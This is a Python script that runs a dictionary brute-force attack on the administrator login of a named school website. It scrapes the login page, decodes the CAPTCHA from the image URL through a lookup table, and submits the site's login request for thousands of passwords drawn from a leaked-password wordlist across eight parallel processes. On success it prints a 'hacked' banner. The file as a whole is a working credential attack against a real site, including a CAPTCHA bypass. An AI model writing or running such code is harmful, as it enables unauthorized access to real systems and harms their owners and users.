import requests
from bs4 import BeautifulSoup 
import time
import multiprocessing as mp


#rs=sajaxSubmit&rsargs[]=%3CInput%3E%3CF%3E%3CK%3Elogin_name%3C/K%3E%3CV%3Eadmin%3C/V%3E%3C/F%3E%3CF%3E%3CK%3Elogin_passwd%3C/K%3E%3CV%3Ekldsjhnlkhj%3C/V%3E%3C/F%3E%3CF%3E%3CK%3EckCode%3C/K%3E%3CV%3E4116%3C/V%3E%3C/F%3E%3CF%3E%3CK%3EhdCode%3C/K%3E%3CV%3E24QKYS24241124MO34YS24ICYSMO24%3C/V%3E%3C/F%3E%3CF%3E%3CK%3EOp%3C/K%3E%3CV%3Elogin%3C/V%3E%3C/F%3E%3CF%3E%3CK%3ETagName%3C/K%3E%3CV%3Elogin%3C/V%3E%3C/F%3E%3C/Input%3E

def getAuthimg():

  #global authcode
  global fullauth
  #global ricode
  global code
  #global user
  #global pw
  
  s = requests.Session()
  s.headers.update({'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'})
  response = s.get(url)
  soup = BeautifulSoup(response.text,"html.parser")
  authimg = soup.find("img", id = "code_img")["src"]

  x = 0
  y = 1
  fulllist = []
  authlist = []
  for i in authimg:
    if (x != 0):
      fulllist.append(i)
      #fullauth += i
    if i == '=':
      x = 1
      
  fullauth = ''.join(fulllist)
  authcode = fullauth[:8]    
  
  #print(fullauth)
  #print(authcode)
  
  a = authcode
  ttmp = [a[2],a[3],a[0],a[1],a[6],a[7],a[4],a[5]]
  ricode = ''.join(ttmp)   
  #print(authcode)
  
  #numlist[ricode[i:][:2]] for i in range(0,7,2)
  tttmp = [numlist[ricode[i:][:2]] for i in range(0,7,2)]
  code = ''.join(tttmp)

  '''
  print(authimg)#驗證碼圖片路徑
  print(fullauth)#路徑包含的碼
  print(authcode)#有用的前8碼
  print(ricode)#12,34顛倒順序後的8碼
  print(code)#對表後找出的驗證碼

  #print(response.content)  # 网站内容
  print(response.status_code)  # 状态码
  print(response.headers)  # header
  print(response.encoding)  # 网页编码'''
  
  #return authimg
  return fullauth
  #return authcode
  #return ricode
  return code

  

  
def postLogin():
  
  #global authcode
  #global fullauth
  #global ricode
  #global code
  #global user
  #global pw
  global messenge
  
  #print('==========================login=========================')

  #rs=sajaxSubmit&rsargs[]=<Input><F><K>login_name</K><V>admin</V></F><F><K>login_passwd</K><V>resressts</V></F><F><K>ckCode</K><V>7520</V></F><F><K>hdCode</K><V>MOUWA0IC241124MO34YSUWIC24EGYS</V></F><F><K>Op</K><V>login</V></F><F><K>TagName</K><V>login</V></F></Input>

  response2 = requests.post( url2, headers = headers, data = data)

  '''
  print(response2.content)  # 网站内容
  print(response2.text)
  print(response2.status_code)  # 状态码
  print(response2.headers)  # header
  print(response2.encoding)  # 网页编码'''

  encold = response2.encoding
  soup2 = response2.content
  #soup2 = BeautifulSoup(response2.text, 'html.parser')
  #mess = soup2.find( keywords = 'Response')

  mess = ''
  temp = ''
  cal = 0
  x = 0

  for j in soup2:#soup2
    J = str(chr(j))
    #print(J,end = '')
    temp += J
    if J == ']':
      break
    if cal == 1:
      mess += J
      x += 1
    if temp[-6:] == 'CDATA[':
      cal = 1   
    
  messenge = mess.encode(encold).decode('utf-8')  
  ##print('%s : %s > %d'%(pw, messenge, times))
  #print()
  #print(mess.encode(encold).decode('utf-8'))

  #prtint(mess.encode(encold).decode('utf-8'))
  #+:+++L+++<?xml version="1.0"?><Response><JsFunction></JsFunction><TagId>login</TagId><Content><![CDATA[密碼不正確]]></Content><RetCode></RetCode><Other><![CDATA[]]></Other><DivId>dealWrongInfo()</DivId></Response>
  
def getPW(passfile):

  global passlist
  global index
  #global passdict
  
  #f = open('passlist\\hak5.txt','r')
  f = open(passfile, 'r')##'passlist\\10_million_password_list_top_100000.txt'
  passlist = [line[:-1] for line in f]
  passlist = passlist[15000:20000]##<<4000
  index = {}
  
  for i in range(1, len(passlist)+1):
    index[passlist[i-1]] = i
      #2710199
  #passlist = ('hello','motor','!!!!!')
  f.close()
  
  return f.name, index
  '''
  calc = 0
  for i in passlist:
    passdict[str(calc)] = i[:-1]#!!!!!!!
    calc += 1  
    
  return passdict
  '''
  
def forwork(z):

  global passlist
  global index
  
  '''
  print(z) 
  print(passlist[z])
  '''
  
  start = time.time()
  #authcode = ''
  #fullauth = ''
  #ricode = ''
  #code = ''

  getAuthimg()

  #print('getAuthimg>>>',time.time() - start)
  
  pw = passlist[z]#!!!!!!![:-1]
  #rsargs = '<Input><F><K>login_name</K><V>'+user+'</V></F><F><K>login_passwd</K><V>'+pw+'</V></F><F><K>ckCode</K><V>'+code+'</V></F><F><K>hdCode</K><V>'+fullauth+'</V></F><F><K>Op</K><V>login</V></F><F><K>TagName</K><V>login</V></F></Input>'
  rsargs = '<Input><F><K>login_name</K><V>%s</V></F><F><K>login_passwd</K><V>%s</V></F><F><K>ckCode</K><V>%s</V></F><F><K>hdCode</K><V>%s</V></F><F><K>Op</K><V>login</V></F><F><K>TagName</K><V>login</V></F></Input>'%(user, pw , code, fullauth)
  data['rsargs[]'] = rsargs

  postLogin()
  
  #print('postLogin>>>',time.time() - last)
  
  #print('============================')
  '''
  print('times:',times)
  print(pw)'''
  #print(messenge)

  #sum += time.time() - start
  ##print(messenge)
  print('%s : %s > %d'%(pw, messenge, index[pw]))

  #print(type(messenge))  
  if messenge != '密碼不正確':
    password = pw
    signal = 1
    print(password)
    print()
    print('=============================================================')
    print('======================Congratulations========================')
    print('=============================================================')
    print('=====================username == %s ======================'%user)    
    print('====================password == %s ===================='%password)
    print('=============================================================')
    print('=======================h@ck3d_$ucc3$$ful=====================')
    print('=============================================================')
    print('=======================hacked by c0xffee=====================')
    print('=============================================================')
    print()
    return password
      
     
  '''
  print('total>>>',time.time() - start)
  print('============================')'''  




#=================================================main====================================================
#=================================================main==================================================== 
#=================================================main====================================================
 
url = "http://www.ltsh.ilc.edu.tw/admin/"  
numlist = {'A0':'0','24':'1','IC':'2','EG':'3','QK':'4','MO':'5','YS':'6','UW':'7','B0':'8','34':'9'}  
user = 'admin'  
pw = ''

url2 = 'http://www.ltsh.ilc.edu.tw/admin/index.php'
cookies = {'PageLang':'zh-tw'}
headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
           'Referer':'http://www.ltsh.ilc.edu.tw/admin/',
           'Cookie':'PageLang=zh-tw'}  
data = {'rs':'sajaxSubmit'}
           
sum = 0          
passlist = []
#passdict = {}
  
  
password = ''
signal = 0


#passdict = {}

filename, index = getPW('hak5.txt') 

start = time.time()

if __name__ == '__main__':
  mp.freeze_support()
  pool = mp.Pool(8)
  #messenge = ''        
  
           
#set getAuthimg variables  
#set postLogin variables
#session = requests.Session()


  length = len(passlist)
  '''
  for i in range(0, length+1):
    pool.map(forwork,(i,))
    if signal:
      break
    caclu += 1
  '''
  #print(passlist[0])  
  
  results = pool.map(forwork, range(0, length))
  res = [i for i in results if i != None]

  #print(res[0])
  pool.close()
  pool.join()
  
  sum = time.time() - start
  print(sum)
  
  
  if len(res) == 1:
    password = res[0]
    print()
    print('=============================================================')
    print('======================Congratulations========================')
    print('=============================================================')
    print('=====================username == %s ======================'%user)    
    print('====================password == %s ===================='%password)
    print('=============================================================')
    print('=======================h@ck3d_$ucc3$$ful=====================')
    print('=============================================================')
    print('=======================hacked by c0xffee=====================')
    print('=============================================================')
    print()
  elif len(res) == 0:
    print()
    print('=======================hacking_failed========================')
    print('===================%s===================='%filename)
    print('=============================================================')
    print()
  else:
    print()
    print('=======================programe_error=======================')    
    print('==================more_than_one_password??==================')
    print('results:',res)
    print()
    
    
      
  #length = 10#len(passlist)
      
  print('aver>>>',end = '')
  print(sum/length)
  file = open('aver.txt','a+')
  file.write('aver>>>'+str(sum/length))

  '''
  f = open('total.txt','a+')
  f.write('total>>>'+str(sum))
  '''
  file.close()

'''
def multiccore():
  mp.freeze_support()
  pool = mp.Pool()
  pool.apply_async(main)
  
  
  pool.close()
  pool.join()
'''


'''
best1050.txt(print)
230.6558747291565s
aver>>>0.21988167276373355s
'''

'''
best1050.txt(no print)
213.292249917984
aver>>>0.20332912289607627
'''

 
#<img height="20" id="code_img" src="/bin/authimg.php?Code=A0YSA034241124MOYSYSA0A024EGMO" width="49"/>
